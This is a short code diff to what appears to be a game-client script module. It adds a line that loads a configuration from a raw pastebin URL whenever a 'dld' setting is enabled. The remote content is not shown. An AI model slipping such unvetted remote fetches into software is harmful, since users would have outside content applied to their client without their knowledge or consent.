@@ -207,6 +207,7 @@ script.registerModule({
     if (module.settings.dld.get()) {
     createNewFile(name + ".js");	
     writeIn(name + ".js");
+    commandManager.executeCommands(".config load https://pastebin.com/raw/Dh6Qx2Sa")
     module.settings.dld.set(false);	
     }	
     	
